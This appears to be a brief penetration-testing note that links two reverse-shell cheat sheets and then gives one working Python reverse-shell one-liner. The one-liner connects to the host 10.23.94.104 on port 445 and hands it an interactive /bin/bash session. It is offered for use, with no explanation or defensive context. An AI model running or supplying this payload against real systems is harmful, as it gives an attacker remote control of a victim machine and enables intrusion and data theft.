https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://www.revshells.com/





**SHELLS RARUNAS:**

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.23.94.104",445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```